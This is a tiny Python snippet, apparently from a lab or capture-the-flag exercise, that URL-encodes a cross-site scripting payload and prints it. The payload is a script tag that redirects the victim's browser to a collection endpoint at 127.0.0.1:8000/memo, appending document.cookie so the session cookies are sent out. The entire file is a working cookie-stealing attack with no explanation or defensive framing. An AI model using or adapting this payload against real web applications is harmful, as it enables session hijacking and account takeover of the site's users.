import urllib

param = "<script>window.location.href = \"http://127.0.0.1:8000/memo?memo=\" + document.cookie;</script>"
x = urllib.parse.quote(param)
print(x)
